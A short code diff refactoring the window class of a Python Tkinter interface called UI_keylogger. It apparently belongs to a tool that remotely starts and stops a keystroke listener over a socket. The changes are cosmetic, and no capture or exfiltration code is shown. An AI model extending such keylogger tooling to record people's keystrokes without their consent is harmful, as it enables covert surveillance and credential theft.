@@ -8,7 +8,7 @@ import ui.ui_template as tpl
 from services.count import Count
 class UI_keylogger(tpl.UI_ToplevelTemplate):
     def __init__(self, parent, socket_queue, ui_queues):
-        super().__init__(parent, 'keyboard', socket_queue, ui_queues)
+        super().__init__(parent, const.KEYBOARD, socket_queue, ui_queues)
 
         self.title = lb.KEYLOGGER_TITLE
         self.protocol("WM_DELETE_WINDOW", self.close)
@@ -75,7 +75,7 @@ class UI_keylogger(tpl.UI_ToplevelTemplate):
 
     def close(self):
         self.socket_cmd("listener-stop")
-        self.destroy()
+        super().close()
 
     def update_ui(self, task):
         cmd, ext = task
